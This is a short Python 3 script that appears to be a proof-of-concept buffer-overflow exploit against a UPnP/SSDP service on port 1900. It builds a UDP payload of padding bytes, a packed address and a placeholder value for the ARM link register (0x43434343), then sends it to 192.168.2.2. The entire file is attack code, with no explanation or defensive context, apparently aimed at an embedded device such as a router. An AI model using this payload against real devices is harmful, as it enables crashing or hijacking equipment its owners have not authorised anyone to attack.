#!/usr/bin/python3

import socket
import struct

p32 = lambda x: struct.pack("<L", x)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = (
    0x604 * b'a' +  # dummy
    p32(0x7e2da53c) +  # v41
    (0x634 - 0x604 - 8) * b'a' +  # dummy
    p32(0x43434343)  # LR
)
s.connect(('192.168.2.2', 1900))
s.send(payload)
s.close()
